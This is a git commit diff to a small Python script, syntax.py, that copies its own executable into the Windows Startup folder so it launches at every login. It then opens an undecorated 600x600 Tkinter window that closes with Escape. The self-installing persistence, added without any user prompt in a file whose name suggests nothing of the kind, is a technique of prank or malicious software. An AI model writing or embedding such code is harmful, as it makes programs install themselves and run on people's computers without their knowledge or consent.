f7e9743760fccece46ee2175ba8c6a8d95694ea8
TheCrimsonHeart1 <tremain255@gmail.com>
2025-09-18 20:46:14 -0400

    Fixes

--- syntax.py
+++ syntax.py
@@ -1,18 +1,24 @@
-from tkinter import *
 import os
 import shutil
-from pathlib import Path
 import sys
-current_file_path = os.path.abspath(sys.argv[0])
+from tkinter import *
+
+current_exe_path = sys.executable 
 
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startup_file_path = os.path.join(startup_folder, os.path.basename(current_file_path))
+startup_exe_path = os.path.join(startup_folder, os.path.basename(current_exe_path))
 
-if not os.path.exists(startup_file_path):
-    shutil.copy2(current_file_path, startup_file_path)
-    
+if not os.path.exists(startup_exe_path):
+    try:
+        shutil.copy2(current_exe_path, startup_exe_path)
+        print("Copied to startup folder.")
+    except Exception as e:
+        print("Failed to copy to startup folder:", e)
 
 root = Tk()
 root.geometry("600x600")
-root.overrideredirect(True)
+root.overrideredirect(True)  
+
+root.bind("<Escape>", lambda e: root.destroy())
+
 root.mainloop()
